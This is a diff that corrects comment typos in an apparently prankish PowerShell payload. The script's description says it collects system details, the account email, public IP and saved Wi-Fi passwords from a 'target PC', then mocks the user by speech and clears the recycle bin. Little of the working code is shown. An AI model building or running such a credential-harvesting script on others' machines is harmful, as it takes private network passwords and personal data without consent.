@@ -19,12 +19,12 @@
 
 <#
 .NOTES
-	This script was not optimized to shorten the code. This script is intended to have as much readablility as possible for new coders to learn. 
+	This script was not optimized to shorten the code. This script is intended to have as much readability as possible for new coders to learn.
 
 .DESCRIPTION 
 	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
 	The SSID and WiFi password of any current or previously connected to networks.
-	It determines the last day they changed thier password and how many days ago.
+	It determines the last day they changed their password and how many days ago.
 	Once the information is gathered the script will pause until a mouse movement is detected
 	Then the script uses Sapi speak to roast their set up and lack of security
 #>
@@ -464,7 +464,7 @@ echo "All Wifi Passes Done"
     $days = [int]$DateArray[0]
     }
  
- # If no password set date is detected funtion will return $null to cancel Sapi Speak
+ # If no password set date is detected function will return $null to cancel Sapi Speak
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "Day password set not found" 
@@ -612,9 +612,9 @@ $blinks = 3;$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $bli
 	Then the script will be paused until the mouse is moved 
 	script will check mouse position every indicated number of seconds
 	This while loop will constantly check if the mouse has been moved 
-	"CAPSLOCK" will be continously pressed to prevent screen from turning off
+	"CAPSLOCK" will be continuously pressed to prevent screen from turning off
 	it will then sleep for the indicated number of seconds and check again
-	when mouse is moved it will break out of the loop and continue theipt
+	when mouse is moved it will break out of the loop and continue the script
 #>
 
 
@@ -691,7 +691,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+# This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off
 
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
